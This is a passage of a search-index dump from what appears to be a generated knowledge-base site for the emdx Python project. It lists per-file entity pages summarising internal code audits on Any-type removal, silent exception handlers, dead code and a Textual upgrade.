</li> </ul> Line Annotation Reason Unnecessary 34 <code>project: str \\| None = None</code> NECESSARY - Some documents have no project 35 <code>updated_at: str \\| None = None</code>... <ul> <li>#6509 Any Type Removal Analysis [synthesis]   Section: Files Changed by Priority <p>...browser_container.py` (7 occurrences)</p> </li> <li><code>emdx/ui/text_areas.py</code> (5 occurrences)</li> <li><code>emdx/ui/command_palette/palette_presenter.py</code> (4 occurrences)</li> <li><code>emdx/commands/compact.py</code> (6 occurrences)</li> <li> <p><code>emdx/commands/distill.py</code> (4 occurrences)</p> </li> <li> <p>#6487 Any Type Removal Analysis [3/5]</p> <p>Using <code>object</code> is acceptable. ---</p> </li> </ul>"},{"location":"entities/emdxuicommandpalettepalettepresenterpy/#file-emdxuicommand_palettepalette_presenterpy","title":"File: <code>emdx/ui/command_palette/palette_presenter.py</code>","text":""},{"location":"entities/emdxuicommandpalettepalettepresenterpy/#4-line-36-paletteresultitemdata-field","title":"4. Line 36: <code>PaletteResultItem.data</code> field","text":"<p>Current:</p> <pre><code>data: dict[str, Any] = field(default_factory=dict)\n</code></pre> <p>**Recommended (using TypedDict ...</p> <ul> <li>#6485 Any Type Removal Analysis [3/5] <p>Recommendation: Keep <code>Any</code> - same reasoning as Occurrence 1. ---</p> </li> </ul>"},{"location":"entities/emdxuicommandpalettepalettepresenterpy/#file-emdxuicommand_palettepalette_presenterpy_1","title":"File: <code>emdx/ui/command_palette/palette_presenter.py</code>","text":""},{"location":"entities/emdxuicommandpalettepalettepresenterpy/#occurrence-4-paletteresultitemdata-field","title":"Occurrence 4: PaletteResultItem.data field","text":"<p>Location: Line 36</p> <p>Current Signature: ```python @dataclass clas...</p> <ul> <li>#6233 Delegate: Dead Code Audit - emdx Project [2/14]   Section: 1. UNUSED IMPORTS (High Priority) <p>...mand`</p> </li> <li><code>emdx/ui/command_palette/palette_commands.py:11</code> - unused import: <code>Any</code></li> <li><code>emdx/ui/command_palette/palette_presenter.py:12</code> - unused import: <code>CommandRegistry</code></li> <li><code>emdx/ui/command_palette/palette_screen.py:11,23</code> - unused imports: <code>Path</code>, <code>ResultType</code></li> <li> <p><code>emdx/ui/document_browser.py:11</code>...</p> </li> <li> <p>#6280 Delegate: DEBT-5: Fix silent exception handlers   Section: Files Modified</p> <ol> <li>emdx/ui/command_palette/palette_presenter.py (line 264-265)</li> </ol> </li> <li>Document ID parsing: Now logs when query is not numeric (debug level)</li> </ul>"},{"location":"entities/emdxuicommandpalettepalettepresenterpy/#related-entities","title":"Related Entities","text":"<ul> <li><code>search_service</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>palette_screen.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>modalscreen.__init__()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>listitem.__init__()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>file:</code>emdx/ui/command_palette/palette_screen.py` \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>file:</code>emdx/ui/command_palette/palette_presenter.py` \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>execute_selected(app: any)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>command palette files</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>any type removal analysis: command palette files</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>textual app</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> </ul>"},{"location":"entities/emdxuidocumentbrowserpy/","title":"emdx/ui/document_browser.py","text":"<p>Type: tech_term | Mentioned in: 8 documents | First seen: 2026-01-10</p>"},{"location":"entities/emdxuidocumentbrowserpy/#documents-8","title":"Documents (8)","text":"<ul> <li> <p>#6391 Delegate: Fix UI race conditions. Task #625: In emdx/ui/document_brows   Section: Task #625: Double-save prevention in DocumentBrowser</p> <p>Problem: In <code>emdx/ui/document_browser.py</code>, the <code>action_save_and_exit_edit()</code> method (lines 461-474) had a fallback in the except block that created a second async task via <code>asyncio.create_task()</code> even thoug...</p> </li> <li> <p>#6353 Delegate: Analyze upgrading textual from ^4.0.0 to ^6.2.1 for the emdx [2/2]   Section: 1.1 Static Widget <code>renderable</code> \u2192 <code>content</code> (v6.0.0)</p> <p>Affected Files:</p> </li> <li><code>emdx/ui/modals.py</code> - Uses <code>Static</code> extensively</li> <li><code>emdx/ui/document_browser.py</code> - Uses <code>Static</code> for status bars</li> <li><code>emdx/ui/search/search_screen.py</code> - Uses <code>Static</code> for mode buttons</li> <li> <p><code>emdx/ui/browser_container.py</code> - Uses <code>Static</code> for fallback e...</p> </li> <li> <p>#6342 Delegate: Document #6330 (Delegate synthesis [synthesis]):</p> </li> </ul>"},{"location":"entities/emdxuidocumentbrowserpy/#emdx-arc-212","title":"EMDX Arc [2/12]","text":"<p>Section: Changes Made</p> <p>...imple, cleanup_worktree - <code>emdx/ui/activity/activity_view.py</code> - get_git_project - <code>emdx/ui/document_browser.py</code> - get_git_project - <code>emdx/ui/presenters/document_browser_presenter.py</code> - get_git_project - <code>tests/test_utils.py</code> - Updated all patch targets</p> <ul> <li>#6233 Delegate: Dead Code Audit - emdx Project [2/14]   Section: 1. UNUSED IMPORTS (High Priority) <p>...command_palette/palette_screen.py:11,23<code>- unused imports:</code>Path<code>,</code>ResultType`</p> </li> <li><code>emdx/ui/document_browser.py:11</code> - unused import: <code>List</code></li> <li><code>emdx/ui/keybindings/__init__.py:19-28</code> - 9 unused re-exports</li> <li><code>emdx/ui/live_log_writer.py:20</code> - unused import: <code>Optional</code></li> <li> <p>`emdx/ui/...</p> </li> <li> <p>#6227 Delegate: Audit ERROR HANDLING DEBT in the emdx project: Find bare exc [8/14]   Section: 1. <code>except Exception: pass</code> - Complete Silent Failures (31 instances)</p> <p>...| <code>emdx/ui/cascade/cascade_view.py</code> | 259-260 | Widget query silently returns | | <code>emdx/ui/document_browser.py</code> | 806-807 | Status fallback silently ignored | | <code>emdx/ui/document_browser.py</code> | 979-984 | Markdown preview fallback, then complete failure ignored | | `emdx/ui/tex...</p> </li> <li> <p>#6220 Delegate: Audit ERROR HANDLING DEBT in the emdx project: Find bare exc [8/14]   Section: \ud83d\udd34 CRITICAL: Silent Failures (except: pass)</p> <p>...mmand_palette/palette_screen.py<code>| 37-38 | Debug logging silently fails | LOW | |</code>emdx/ui/document_browser.py<code>| 806 | Status update fallback silently fails | LOW | |</code>emdx/ui/document_browser.py<code>| 979 | Markdown render fallback silently fails | LOW | |</code>emdx/ui/document_br...</p> </li> <li> <p>#6167 Delegate: Analyze how tasks appear in the TUI. Read emdx/ui/browser_co [6/15]   Section: Files Examined</p> <p>...dx/ui/browser_container.py<code>| Main TUI container, switches between 4 browsers | |</code>emdx/ui/document_browser.py<code>| Document list + preview + edit | |</code>emdx/ui/activity_browser.py<code>| Wrapper for ActivityView | |</code>emdx/ui/activity/activity_view.py` | Mission Control \u2014 shows agen...</p> </li> <li> <p>#4422 Tech Debt Discovery - Discovery Synthesis   Section: High Severity Examples</p> <p>...y<code>| 165-166 |</code>except Exception: return None<code>| Add specific exception types | |</code>emdx/ui/document_browser.py<code>| 269-270 | State save silently fails | Log the error at minimum | |</code>emdx/ui/document_browser.py<code>| 284-285 | State restore silently fails | Log warning | |</code>emdx/...</p> </li> </ul>"},{"location":"entities/emdxuidocumentbrowserpy/#related-entities","title":"Related Entities","text":"<ul> <li><code>key findings:</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>error handling debt audit - emdx project</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>emdx/ui/activity_browser.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.3)</li> <li><code>static</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>missing retry logic</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>logger.error()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>emdx/ui/log_browser_display.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.0)</li> <li><code>selectiontextarea</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> <li><code>document browser</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> <li><code>emdx/commands/status.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.4)</li> </ul>"},{"location":"entities/emdxuimodalspy/","title":"emdx/ui/modals.py","text":"<p>Type: tech_term | Mentioned in: 8 documents | First seen: 2026-02-14</p>"},{"location":"entities/emdxuimodalspy/#documents-8","title":"Documents (8)","text":"<ul> <li>#6518 Any removal Phase 1: Quick wins   Section: 1. Changed <code>**kwargs: Any</code> to <code>**kwargs: object</code> in UI <code>__init__</code> methods <p>...extArea.init`</p> </li> <li><code>emdx/ui/search/search_screen.py</code> - <code>SearchScreen.__init__</code></li> <li><code>emdx/ui/modals.py</code> - <code>DocumentPreviewModal.__init__</code></li> <li><code>emdx/ui/inputs.py</code> - <code>TitleInput.__init__</code></li> <li><code>emdx/ui/vim_editor.py</code> - <code>VimEditor.__init__</code></li> <li> <p><code>emdx/ui/vim_line_numbers.py</code> - `...</p> </li> <li> <p>#6510 None Type Analysis [7/7]</p> <p><code>emdx/ui/task_view.py</code></p> </li> </ul> Line Annotation Reason Unnecessary 155 <code>self._epics: dict[str \\| None, EpicTaskDict]</code> NECESSARY - <code>epic_key</code> can be None 253 `_get_selected_task() -&gt; TaskDict ... <ul> <li>#6493 Any Type Removal Analysis [2/5] </li> </ul> Line Current Signature Recommended Type Rationale 155 <code>HELP_CATEGORIES: dict = {}</code> <code>dict[str, str]</code> Maps action names to category names 328 ... <ul> <li>#6353 Delegate: Analyze upgrading textual from ^4.0.0 to ^6.2.1 for the emdx [2/2]   Section: 1.1 Static Widget <code>renderable</code> \u2192 <code>content</code> (v6.0.0) <p>Affected Files:</p> </li> <li><code>emdx/ui/modals.py</code> - Uses <code>Static</code> extensively</li> <li><code>emdx/ui/document_browser.py</code> - Uses <code>Static</code> for status bars</li> <li><code>emdx/ui/search/search_screen.py</code> - Uses <code>Static</code> for mode buttons</li> <li> <p>`...</p> </li> <li> <p>#6227 Delegate: Audit ERROR HANDLING DEBT in the emdx project: Find bare exc [8/14]   Section: 1. <code>except Exception: pass</code> - Complete Silent Failures (31 instances)</p> <p>...| | <code>emdx/ui/text_areas.py</code> | 169-170 | Error status update silently ignored | | <code>emdx/ui/modals.py</code> | 384-385 | Preview write silently ignored | | <code>emdx/services/unified_search.py</code> | 585-586 | Returns False on any DB error |</p> </li> <li> <p>#6220 Delegate: Audit ERROR HANDLING DEBT in the emdx project: Find bare exc [8/14]   Section: \ud83d\udd34 CRITICAL: Silent Failures (except: pass)</p> <p>...| <code>emdx/ui/text_areas.py</code> | 169-170 | Vim status update silently fails | LOW | | <code>emdx/ui/modals.py</code> | 384-385 | Markdown rendering silently falls back | LOW | | <code>emdx/ui/log_browser_display.py</code> | 97-98 | Error display silently fails | MEDIUM | | `emdx/ui/log_brows...</p> </li> </ul>"},{"location":"entities/emdxuimodalspy/#7-emdxuimodalspy","title":"7. <code>emdx/ui/modals.py</code>","text":""},{"location":"entities/emdxuimodalspy/#related-entities","title":"Related Entities","text":"<ul> <li><code>emdx/ui/task_view.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>9.</code>emdx/ui/task_view.py` \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>simplevimlinenumbers.__init__</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>self.observer</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>searchscreen.__init__</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>query_one</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>misc files</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>logbrowserhost.__init__</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>logbrowser.__init__</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>kwargs: any)</code> | `` \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> </ul>"},{"location":"entities/emdxuisearchsearchscreenpy/","title":"emdx/ui/search/search_screen.py","text":"<p>Type: tech_term | Mentioned in: 12 documents | First seen: 2026-02-14</p>"},{"location":"entities/emdxuisearchsearchscreenpy/#documents-12","title":"Documents (12)","text":"<ul> <li> <p>#6610 Delegate: Search the entire emdx codebase for every import or referenc [2/2]   Section: Production Code \u2014 UI/Display Emojis (NOT in EMOJI_ALIASES)</p> <p>...owser_filtering.py<code>| 28-36, 47-49, 102 | \ud83d\udccb\ud83d\ude80\u2705\ud83d\udcca\ud83d\udd27\ud83d\udcdd\u26a1 | Wrapper pattern filtering | |</code>emdx/ui/search/search_screen.py<code>| 283, 285, 287, 289, 299-305 | \ud83e\udde0\ud83c\udff7\ufe0f\ud83d\udd0d\ud83d\udcdd | Search result source icons | |</code>emdx/ui/activity/activity_items.py` | 84, 162-166, 172, 218, 298-299 | \u2705\ud83d\udccb\ud83c\udff7\ufe0f\ud83d\udcca\ud83d\udcdd\u274c | Activity vi...</p> </li> <li> <p>#6518 Any removal Phase 1: Quick wins   Section: 1. Changed <code>**kwargs: Any</code> to <code>**kwargs: object</code> in UI <code>__init__</code> methods</p> <p>...ui/text_areas.py<code>-</code>SelectionTextArea.init<code>and</code>VimEditTextArea.init`</p> </li> <li><code>emdx/ui/search/search_screen.py</code> - <code>SearchScreen.__init__</code></li> <li><code>emdx/ui/modals.py</code> - <code>DocumentPreviewModal.__init__</code></li> <li><code>emdx/ui/inputs.py</code> - <code>TitleInput.__init__</code></li> <li> <p><code>emdx/ui/vim_editor.py</code> - `VimEdit...</p> </li> <li> <p>#6510 None Type Analysis [7/7]</p> <p><code>emdx/ui/text_areas.py</code></p> </li> </ul> Line Annotation Reason Unnecessary 79 <code>self.visual_start: tuple[int, int] \\| None = None</code> NECESSARY - Only set in visual mode 80 `self.visual_end: tuple[int, i... <ul> <li>#6493 Any Type Removal Analysis [2/5] <p>```</p> </li> </ul>"},{"location":"entities/emdxuisearchsearchscreenpy/#3-emdxuisearchsearch_screenpy","title":"3. <code>emdx/ui/search/search_screen.py</code>","text":"Line Current Signature Recommended Type Rationale 137 <code>def __init__(self, *args: Any, **kwargs: Any)</code> `args: object, *kwargs:... <ul> <li>#6362 Delegate: DEBT-5: Fix silent exception handlers in the emdx codebase.  [2/3]   Section: DEBT-5: Fix Silent Exception Handlers <p>...11. <code>emdx/ui/markdown_config.py</code> - ImportError fallback to terminal detection</p> </li> <li><code>emdx/ui/search/search_screen.py</code> - Various widget query and timer failures</li> <li><code>emdx/ui/text_areas.py</code> - Best-effort status update after error</li> <li> <p><code>emdx/utils/datetime_utils.py</code> - ISO format parse...</p> </li> <li> <p>#6353 Delegate: Analyze upgrading textual from ^4.0.0 to ^6.2.1 for the emdx [2/2]   Section: 1.1 Static Widget <code>renderable</code> \u2192 <code>content</code> (v6.0.0)</p> <p>...ic` extensively</p> </li> <li><code>emdx/ui/document_browser.py</code> - Uses <code>Static</code> for status bars</li> <li><code>emdx/ui/search/search_screen.py</code> - Uses <code>Static</code> for mode buttons</li> <li><code>emdx/ui/browser_container.py</code> - Uses <code>Static</code> for fallback error messages</li> <li> <p><code>emdx/ui/cascade/cascade_view.py</code> - Uses <code>Static</code> fo...</p> </li> <li> <p>#6286 Delegate: DEBT-12: Fix overly broad exception catches   Section: Not Modified (DEBT-5 scope)</p> <p>...- <code>emdx/ui/command_palette/palette_screen.py:37</code></p> </li> <li><code>emdx/ui/text_areas.py:169</code></li> <li><code>emdx/ui/search/search_screen.py</code> (multiple locations)</li> <li><code>emdx/ui/document_browser.py:979,982</code></li> <li><code>emdx/ui/activity_browser.py:101</code></li> <li><code>emdx/commands/delegate.py:64,75</code></li> <li> <p><code>emdx/commands/core.py:321</code> -...</p> </li> <li> <p>#6233 Delegate: Dead Code Audit - emdx Project [2/14]   Section: 4. STUB/EMPTY FUNCTIONS (Potential Dead Code)</p> <p>...action_focus_prev`</p> </li> <li><code>emdx/ui/activity/activity_data.py:39</code> - empty: <code>__init__</code></li> <li><code>emdx/ui/search/search_screen.py:323</code> - stub: <code>_update_selection</code></li> <li><code>emdx/ui/search/search_screen.py:552</code> - stub: <code>action_switch_search</code></li> <li> <p><code>emdx/ui/cascade/cascade_browser.py:147</code> - empty: `action_s...</p> </li> <li> <p>#6227 Delegate: Audit ERROR HANDLING DEBT in the emdx project: Find bare exc [8/14]   Section: 1. <code>except Exception: pass</code> - Complete Silent Failures (31 instances)</p> <p>...mdx/commands/core.py<code>| 321-322 | Gist metadata save failure silently ignored | |</code>emdx/ui/search/search_screen.py<code>| 212-213 | Button state update silently ignored | |</code>emdx/ui/search/search_screen.py<code>| 320-321 | Time formatting returns empty string | |</code>emdx/ui/search/search_s...</p> </li> <li> <p>#6220 Delegate: Audit ERROR HANDLING DEBT in the emdx project: Find bare exc [8/14]   Section: \ud83d\udd34 CRITICAL: Silent Failures (except: pass)</p> <p>...<code>emdx/ui/activity_browser.py</code> | 101-103 | Focus attempt silently fails | LOW | | <code>emdx/ui/search/search_screen.py</code> | 212-213 | Mode button update silently fails | LOW | | <code>emdx/ui/search/search_screen.py</code> | 320-321 | Relative time format silently fails | LOW | | `emdx/ui/search/...</p> </li> </ul>"},{"location":"entities/emdxuisearchsearchscreenpy/#related-entities","title":"Related Entities","text":"<ul> <li><code>emdx/ui/modals.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (8 shared docs, PMI=6.1)</li> <li><code>emdx/ui/log_browser_navigation.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=6.1)</li> <li><code>emdx/ui/log_browser.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=6.1)</li> <li><code>emdx/ui/themes.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>emdx/ui/task_view.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>9.</code>emdx/ui/task_view.py` \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>simplevimlinenumbers.__init__</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>self.observer</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>searchscreen.__init__</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>emdx/ui/vim_line_numbers.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.9)</li> </ul>"},{"location":"entities/emdxuitextareaspy/","title":"emdx/ui/text_areas.py","text":"<p>Type: heading | Mentioned in: 14 documents | First seen: 2026-01-10</p>"},{"location":"entities/emdxuitextareaspy/#documents-14","title":"Documents (14)","text":"<ul> <li>#6562 Delegate: Remove vim_line_numbers and VimEditor dead code from the TUI   Section: Files Updated </li> <li>Removed <code>VimEditTextArea</code> class (637 lines of vim modal editing logic)</li> <li>Removed <code>EditTextArea</code> backward compatibility alias</li> <li> <p>Removed <code>re</code> import no longer needed...</p> </li> <li> <p>#6518 Any removal Phase 1: Quick wins   Section: 1. Changed <code>**kwargs: Any</code> to <code>**kwargs: object</code> in UI <code>__init__</code> methods</p> <p>...<code>emdx/ui/browser_container.py</code> - <code>BrowserContainer.__init__</code> and <code>exit</code> methods</p> </li> <li><code>emdx/ui/text_areas.py</code> - <code>SelectionTextArea.__init__</code> and <code>VimEditTextArea.__init__</code></li> <li><code>emdx/ui/search/search_screen.py</code> - <code>SearchScreen.__init__</code></li> <li> <p><code>emdx/ui/modals.py</code> - `DocumentPreview...</p> </li> <li> <p>#6514 Any removal Phase 3: Protocols</p> </li> <li> <p><code>SelectionTextArea.__init__</code>: Changed <code>app_instance: Any</code> to <code>app_instance: SelectionModeHost</code></p> </li> <li><code>VimEditTextArea.__init__</code>: Changed <code>app_instance: Any</code> to <code>app_instance: VimEditorHost</code></li> <li> <p>`_clear_title_select...</p> </li> <li> <p>#6510 None Type Analysis [7/7]</p> <p><code>emdx/ui/modals.py</code></p> </li> </ul> Line Annotation Reason Unnecessary 79 <code>bindings: list[tuple[str, str, str]] \\| None = None</code> NECESSARY - Uses default when None 331 `self._doc_data: dict[str, Any] ... <ul> <li>#6509 Any Type Removal Analysis [synthesis]   Section: Files Changed by Priority <p>...Should Fix (improves clarity)</p> </li> <li><code>emdx/ui/browser_container.py</code> (7 occurrences)</li> <li><code>emdx/ui/text_areas.py</code> (5 occurrences)</li> <li><code>emdx/ui/command_palette/palette_presenter.py</code> (4 occurrences)</li> <li><code>emdx/commands/compact.py</code> (6 occurrences)</li> <li> <p><code>emdx/commands/distill.py</code> (4 occurr...</p> </li> <li> <p>#6493 Any Type Removal Analysis [2/5]</p> <p><code>emdx/ui/browser_container.py</code></p> </li> </ul> Line Current Signature Recommended Type Rationale 7 <code>from typing import Any</code> Keep for specific uses Module import 26-28 `def get_keybi... <ul> <li>#6362 Delegate: DEBT-5: Fix silent exception handlers in the emdx codebase.  [2/3]   Section: DEBT-5: Fix Silent Exception Handlers <p>.... <code>emdx/ui/search/search_screen.py</code> - Various widget query and timer failures</p> </li> <li><code>emdx/ui/text_areas.py</code> - Best-effort status update after error</li> <li> <p><code>emdx/utils/datetime_utils.py</code> - ISO format parse failure before fallback</p> </li> <li> <p>#6353 Delegate: Analyze upgrading textual from ^4.0.0 to ^6.2.1 for the emdx [2/2]   Section: 1.3 TextArea Default Changes (v0.48.0)</p> <p>Affected Files:</p> </li> <li> <p><code>emdx/ui/text_areas.py</code> - <code>SelectionTextArea</code> and <code>VimEditTextArea</code> classes</p> </li> <li> <p>#6227 Delegate: Audit ERROR HANDLING DEBT in the emdx project: Find bare exc [8/14]   Section: 1. <code>except Exception: pass</code> - Complete Silent Failures (31 instances)</p> <p>...wser.py<code>| 979-984 | Markdown preview fallback, then complete failure ignored | |</code>emdx/ui/text_areas.py<code>| 169-170 | Error status update silently ignored | |</code>emdx/ui/modals.py<code>| 384-385 | Preview write silently ignored | |</code>emdx/services/unified_search.py` | 585-586...</p> </li> <li> <p>#6220 Delegate: Audit ERROR HANDLING DEBT in the emdx project: Find bare exc [8/14]   Section: \ud83d\udd34 CRITICAL: Silent Failures (except: pass)</p> <p>...y/activity_view.py<code>| 432-434 | Markdown render fallback silently fails | LOW | |</code>emdx/ui/text_areas.py<code>| 169-170 | Vim status update silently fails | LOW | |</code>emdx/ui/modals.py<code>| 384-385 | Markdown rendering silently falls back | LOW | |</code>emdx/ui/log_browser_display...</p> </li> <li> <p>#4422 Tech Debt Discovery - Discovery Synthesis   Section: High Severity Examples</p> <p>...<code>| 118-119, 248-249 | Git operations fail silently | Specific git exceptions | |</code>emdx/ui/text_areas.py<code>| 411-412, 692-693 | Widget access errors hidden | Use proper query guards | |</code>emdx/ui/file_browser/actions.py` | 318-555 | 6+ instances in file ops | Need specifi...</p> </li> <li> <p>#6280 Delegate: DEBT-5: Fix silent exception handlers   Section: Files Modified</p> <ol> <li>emdx/ui/text_areas.py (line 169-170)</li> </ol> </li> <li>Vim status update fallback: Now logs when status update fails after error</li> </ul>"},{"location":"entities/emdxuitextareaspy/#emdxuitext_areaspy_1","title":"emdx/ui/text_areas.py","text":""},{"location":"entities/emdxuitextareaspy/#2-updated-emdxuitext_areaspy","title":"2. Updated <code>emdx/ui/text_areas.py</code>","text":""},{"location":"entities/emdxuitextareaspy/#related-entities","title":"Related Entities","text":"<ul> <li><code>emdx/ui/modals.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (8 shared docs, PMI=5.9)</li> <li><code>emdx/ui/vim_editor.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (7 shared docs, PMI=5.9)</li> <li><code>emdx/ui/vim_line_numbers.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=5.9)</li> <li><code>emdx/ui/inputs.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.9)</li> <li><code>kwargs: any</code> to `` \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.9)</li> <li><code>emdx/ui/task_view.py</code> 